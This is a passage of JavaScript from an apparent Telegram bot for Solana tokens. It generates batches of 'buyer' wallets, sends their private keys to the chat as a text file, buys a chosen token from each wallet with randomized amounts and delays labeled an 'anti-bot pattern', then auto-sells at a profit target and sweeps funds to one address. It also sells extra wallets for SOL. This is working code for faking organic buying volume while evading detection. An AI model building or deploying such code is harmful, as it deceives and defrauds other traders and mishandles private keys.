        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        ...actionMenu(session)
      }
    );
  } else {
    // fallback if no message_id (just send new message)
    bot.sendMessage(chatId, '⚡ Trade Panel', actionMenu(session));
  }
}

 /* GENERATE BUYERS */
if (data === 'buyer_wallets') {
  // Disable buttons to prevent spamming
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  return bot.sendMessage(chatId, 'Select amount:', buyerOptionsMenu());
}

if (data.startsWith('gen_')) {
  const count = parseInt(data.split('_')[1]);
  session.buyers = [];
  let out = `MAIN WALLET\n${session.mainWallet.publicKey}\n\n`;

  // Disable buttons while generating
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  for (let i = 0; i < count; i++) {
    const kp = Keypair.generate();
    const pub = kp.publicKey.toBase58();
    const priv = base58Encode(kp.secretKey);
    session.buyers.push({ pub, priv });
    out += `${pub}\n${priv}\n\n`;
  }

  // Save buyers file
  const file = path.join(__dirname, `buyers_${chatId}.txt`);
  fs.writeFileSync(file, out);
  await bot.sendDocument(chatId, file);
  fs.unlinkSync(file);

  // First, editable TXT prompt
  if (query?.message?.message_id) {
    await bot.editMessageText(
      '📄 Your buyer wallets TXT file is ready — download it NOW and keep it safe! 🔒',
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
      }
    );
  }

  // Then, send the trade panel as the latest message
  return bot.sendMessage(
    chatId,
    '🔥 Buyer wallets GENERATED! 🔥\n🚀 Wallets are prepped for action! 💰 *Important:* Make sure you have SOL before entering the trade panel. ⚠️',
    postBuyerMenu()
  );
}

  /* ----------------- TRADE TOGGLE (pendingInput + delete) ----------------- */
if (data === 'trade_toggle') {
  if (session.isTrading) {
    session.isTrading = false;
    if (session.sellInterval) clearInterval(session.sellInterval);
    return bot.sendMessage(chatId, '🔴 Trading stopped.', postBuyerActionMenu(session));
  }

  // Check if buyer wallets exist
  if (!session.buyers || session.buyers.length === 0) {
    return bot.sendMessage(chatId, '❌ No buyer wallets generated.');
  }

  // Check if wallets have usable SOL
  const feeBuffer = 0.001;
  let walletsWithBalance = 0;

  for (const buyer of session.buyers) {
    const solBal = await getBalance(buyer.pub);
    if (solBal > session.tradeConfig.minBuy + feeBuffer) walletsWithBalance++;
  }

  if (walletsWithBalance === 0) {
    return bot.sendMessage(
      chatId,
      '❌ Cannot start trading.\nNo buyer wallet has enough SOL balance.'
    );
  }

  // Prompt user for token mint address
  bot.sendMessage(chatId, '➡️ Enter token mint address:');

  // Set pendingInput to capture the mint address
  session.pendingInput = {
    type: 'trade_mint_address',
    resolve: async (input, msg) => {
      // 🔥 Delete user's message immediately
      try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}

      const mintInput = input.trim();
      try {
        new PublicKey(mintInput); // validate address
      } catch {
        return bot.sendMessage(chatId, '❌ Invalid mint address.');
      }

      session.tradeConfig.contractAddress = mintInput;
      session.isTrading = true;

      // Start trading logic
      performRealTrading(session, chatId);

      bot.sendMessage(
        chatId,
        `🟢 Trading started.\nActive wallets: ${walletsWithBalance}`,
        postBuyerActionMenu(session)
      );
    }
  };
}

/* --------------- REAL BUY TRADING --------------- */
async function performRealTrading(session, chatId) {

  const { contractAddress, minBuy, maxBuy, slippage } = session.tradeConfig;

  for (let i = 0; i < session.buyers.length; i++) {

    if (!session.isTrading) break;

    const buyer = session.buyers[i];

    try {
      const solBalance = await getBalance(buyer.pub);
      const feeBuffer = 0.001;

      if (solBalance <= minBuy + feeBuffer) continue;

      // Random buy amount
      const buyAmount =
        Math.random() * (maxBuy - minBuy) + minBuy;

      if (buyAmount > solBalance - feeBuffer) continue;

      const body = {
        publicKey: buyer.pub,
        action: "buy",
        mint: contractAddress,
        amount: buyAmount.toFixed(6),
        denominatedInSol: true,
        slippage: slippage,
        priorityFee: 0.001,
        pool: "auto"
      };

      const res = await axios.post(
        'https://pumpportal.fun/api/trade-local',
        body,
        { responseType: 'arraybuffer' }
      );

      const tx = VersionedTransaction.deserialize(
        new Uint8Array(res.data)
      );

      tx.sign([Keypair.fromSecretKey(base58Decode(buyer.priv))]);

      await connection.sendRawTransaction(
        tx.serialize(),
        { skipPreflight: true }
      );

      // Save entry tracking for sell monitor
      buyer.trade = {
        entrySol: buyAmount
      };

      bot.sendMessage(
        chatId,
        `🟢 Wallet #${i + 1} bought ${buyAmount.toFixed(4)} SOL`
      );

      // Small delay between wallets (anti-bot pattern)
      await new Promise(r => setTimeout(r, 1500));

    } catch (err) {
      console.log("Buy error:", err.message);
    }
  }

  // Start sell monitor after buying
  startSellMonitor(session, chatId);
}

/* — TRANSFER NOW */
if (data === 'auto_transfer') {
  const session = sessions[chatId];

  if (!session.mainWallet) {
    return bot.sendMessage(chatId, '❌ Create or import a wallet first.');
  }

  if (!session.addWalletCount || !session.addWalletPrice) {
    return bot.sendMessage(chatId, '❌ No wallet purchase in progress.');
  }

  // ✅ Vanish inline buttons immediately to prevent spamming
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  try {
    const sender = Keypair.fromSecretKey(
      base58Decode(session.mainWallet.privateKey)
    );

    const receiver = new PublicKey(process.env.SOL_PAYMENT_ADDRESS);

    const lamports = Math.floor(
      session.addWalletPrice * LAMPORTS_PER_SOL
    );

    const tx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: sender.publicKey,
        toPubkey: receiver,
        lamports
      })
    );

    // ✅ Attempt payment
    await sendAndConfirmTransaction(connection, tx, [sender]);
    await new Promise(r => setTimeout(r, 100));

    // ✅ Payment successful — generate wallets
    let output = '';
    for (let i = 0; i < session.addWalletCount; i++) {
      const kp = Keypair.generate();
      const pub = kp.publicKey.toBase58();
      const priv = base58Encode(kp.secretKey);

      session.buyers.push({ pub, priv });
      output += `${pub}\n${priv}\n\n`;
    }

    const file = path.join(__dirname, `buyers_${chatId}.txt`);
    fs.writeFileSync(file, output);
    await bot.sendDocument(chatId, file);
    fs.unlinkSync(file);

    // ✅ Show success message with number of wallets generated
    await bot.sendMessage(
      chatId,
      `🎉 Wallets generated successfully!\n\n` +
      `👥 Number of wallets generated: ${session.addWalletCount}`,
      { parse_mode: 'Markdown' }
    );

    // Clear session addWallet data
    session.addWalletCount = null;
    session.addWalletPrice = null;

    // ✅ Switch panel to Trade Panel
    await bot.sendMessage(chatId, '🚀 Back to Trade Panel', actionMenu(session));

  } catch (err) {
    console.log(err);

    // ❌ Payment failed — stay in Bot Settings
    await bot.sendMessage(chatId, '❌ Payment failed. Not enough SOL', botSettingsPanel());
  }
}

// --- PAID WALLET BUTTONS (50 / 100 wallets) ---
if (data === 'paid_20' || data === 'paid_50' || data === 'paid_100') {
  const session = sessions[chatId];

if (!session.mainWallet) {
    return bot.sendMessage(chatId, '❌ You must create or import a wallet first.');
  }

  let count, solPrice;

  if (data === 'paid_20') {
    count = 20;
    solPrice = 0.1;
  } else if (data === 'paid_50') {
    count = 50;
    solPrice = 0.5;
  } else {
    count = 100;
    solPrice = 1;
  }

  session.addWalletCount = count;
  session.addWalletPrice = solPrice;

  return bot.sendMessage(
    chatId,
    `💰 *Confirm Purchase*\n\n` +
    `Wallets: ${count}\n` +
    `Amount: *${solPrice} SOL*\n\n` +
    `Click *Transfer Now* to send payment to developer wallet address:\n` +
    `\`${process.env.SOL_PAYMENT_ADDRESS}\``,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🚀 Transfer Now', callback_data: 'auto_transfer' }],
          [{ text: '❌ Cancel', callback_data: 'cancel_payment' }]
        ]
      }
    }
  );
}

/* --------------- SELL MONITOR --------------- */
function startSellMonitor(session, chatId) {
  const { takeProfitPercent, sellPortionPercent, contractAddress } = session.tradeConfig;

  session.sellInterval = setInterval(async () => {
    if (!session.isTrading) {
      clearInterval(session.sellInterval);
      return;
    }

    for (let i = 0; i < session.buyers.length; i++) {
      const buyer = session.buyers[i];

      try {
        if (!buyer.trade) continue;

        const currentValue = await getTokenValueInSol(
          buyer.pub,
          contractAddress
        );

        if (!currentValue || currentValue <= 0) continue;

        const target =
          buyer.trade.entrySol * (1 + takeProfitPercent / 100);

        if (currentValue >= target) {

          const totalTokenBal = await getTokenBalance(
            buyer.pub,
            contractAddress
          );

          if (totalTokenBal <= 0) continue;

          const sellAmount =
            totalTokenBal * (sellPortionPercent / 100);

          const solReceived = await sellTokenAmount(
            buyer,
            sellAmount,
            contractAddress
          );

          // Reduce entrySol proportionally so we can sell again later
          buyer.trade.entrySol =
            buyer.trade.entrySol *
            (1 - sellPortionPercent / 100);

          // Fetch updated balances
          const remainingToken = await getTokenBalance(
            buyer.pub,
            contractAddress
          );

          const solBalance = await getBalance(buyer.pub);

          bot.sendMessage(
            chatId,
            `💰 *Wallet #${i + 1} SOLD!*\n\n` +
            `🔹 Token Sold: ${sellAmount.toFixed(4)} tokens\n` +
            `💵 SOL Received: ${solReceived?.toFixed?.(6) || 'Confirmed'} SOL\n\n` +
            `📦 Total Token Remaining: ${remainingToken.toFixed(4)}\n` +
            `💰 Total SOL Balance: ${solBalance.toFixed(6)} SOL`,
            { parse_mode: 'Markdown' }
          );
        }

      } catch (err) {
        console.log(`Sell monitor error for ${buyer.pub}`, err.message);
      }
    }

  }, 30_000); // checks every 30 seconds
}

/* --------------- SELL HELPERS --------------- */
async function sellTokenAmount(buyer, amount, mint) {
  const body = {
    publicKey: buyer.pub,
    action: "sell",
    mint,
    amount: amount.toString(),
    denominatedInSol: false,
    slippage: 10,
    priorityFee: 0.001,
    pool: "auto"
  };

  const res = await axios.post(
    'https://pumpportal.fun/api/trade-local',
    body,
    { responseType: 'arraybuffer' }
  );

  const tx = VersionedTransaction.deserialize(
    new Uint8Array(res.data)
  );

  tx.sign([Keypair.fromSecretKey(base58Decode(buyer.priv))]);

  const sig = await connection.sendRawTransaction(
    tx.serialize(),
    { skipPreflight: true }
  );

  return getBalance(buyer.pub); // return updated SOL balance
}

/* --------------- SELL ALL --------------- */
  if (data === 'sell_all') {
  if (!session.tradeConfig.contractAddress) {
    return bot.sendMessage(chatId, '❌ No token selected.');
  }

  return sellAllPositions(session, chatId);
}

/* — TOKEN BALANCES */
if (data === 'token_balances') {
  if (!session.buyers || session.buyers.length === 0) 
    return bot.sendMessage(chatId, '❌ No buyer wallets.');

  if (!session.tradeConfig.contractAddress) 
    return bot.sendMessage(chatId, '❌ No token selected.');

  let message = `📊 *Token Balances*\nToken: \`${session.tradeConfig.contractAddress}\`\n\n`;

  for (let i = 0; i < session.buyers.length; i++) {
    const buyer = session.buyers[i];
    const bal = await getTokenBalance(buyer.pub, session.tradeConfig.contractAddress);
    message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal}\n\n`;
  }

  return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...postBuyerActionMenu(session) });
}

/* — TOKEN INFO */
if (data === 'token_info') {
  if (!session.tradeConfig?.contractAddress) {
    return bot.sendMessage(chatId, '❌ No token selected.');
  }

  try {
    const mint = session.tradeConfig.contractAddress;

    // Fetch token data from DexScreener
    const res = await axios.get(
      `https://api.dexscreener.com/latest/dex/tokens/${mint}`
    );

    const pair = res.data.pairs?.[0];

    if (!pair) {
      return bot.sendMessage(chatId, '❌ Token data not found.');
    }

    const price = parseFloat(pair.priceUsd).toFixed(8);
    const chartUrl = pair.url; // DexScreener chart link
    const name = pair.baseToken.name;
    const symbol = pair.baseToken.symbol;

    return bot.sendMessage(
      chatId,
      `📊 *Token Info*\n\n` +
      `🪙 *Name:* ${name} (${symbol})\n` +
      `💵 *Price:* $${price}\n` +
      `📍 *Contract:*\n\`${mint}\`\n\n` +
      `📈 [View Chart on DexScreener](${chartUrl})`,
      {
        parse_mode: 'Markdown',
        disable_web_page_preview: false,
        ...postBuyerActionMenu(session)
      }
    );

  } catch (err) {
    console.log(err.message);
    return bot.sendMessage(chatId, '❌ Failed to fetch token info.');
  }
}

/* --------------- SELL ALL LOGIC --------------- */
async function sellAllPositions(session, chatId) {
  session.isTrading = false;
  if (session.sellInterval) clearInterval(session.sellInterval);

  // Sell all tokens for all buyers
  for (const buyer of session.buyers) {
    const bal = await getTokenBalance(buyer.pub, session.tradeConfig.contractAddress);
    if (bal > 0) await sellTokenAmount(buyer, bal, session.tradeConfig.contractAddress);
  }

  // New post-sell panel
  const postSellPanel = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '💸 Transfer to Main', callback_data: 'transfer_main' },
          { text: '📂 Wallet Status', callback_data: 'wallet_status' }
        ],
        [
          { text: '📊 Bot Wallet Balances', callback_data: 'bot_balances' },
          { text: '👥 Distribute SOL', callback_data: 'distribute_sol' }
        ],
        [
          { text: '🏠 Main Menu', callback_data: 'main_menu' }
        ]
      ]
    }
  };

  bot.sendMessage(
    chatId,
    '✅ Sell all complete. Choose your next action:',
    postSellPanel
  );
}

/* --------------- TRANSFER TO ADDRESS --------------- */
async function transferAllToAddress(session, chatId, receiverPubkey, buyers) {
  const rentBuffer = 0.002;
  let success = 0;
  let skipped = 0;
  let totalSent = 0;

  for (const buyer of buyers) {
    try {
      const solBal = await getBalance(buyer.pub);

      if (solBal <= rentBuffer) {
        skipped++;
        continue;
      }

      const lamportsToSend = Math.floor(
        (solBal - rentBuffer) * LAMPORTS_PER_SOL
      );

      if (lamportsToSend <= 0) {
        skipped++;
        continue;
      }

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(buyer.pub),
          toPubkey: receiverPubkey,
          lamports: lamportsToSend
        })
      );

      await sendAndConfirmTransaction(connection, tx, [
        Keypair.fromSecretKey(base58Decode(buyer.priv))
      ]);

      totalSent += lamportsToSend / LAMPORTS_PER_SOL;
      success++;

    } catch {
      skipped++;
    }
  }

  bot.sendMessage(
    chatId,
    `🟢 *Transfer Complete*\n\n` +
    `📤 Receiver:\n\`${receiverPubkey.toBase58()}\`\n\n` +
    `💰 Total Sent: ${totalSent.toFixed(6)} SOL\n` +
    `✅ Wallets Transferred: ${success}\n` +
    `⚠️ Wallets Skipped: ${skipped}`,
    { parse_mode: 'Markdown', ...actionMenu(session) }
  );
}
});
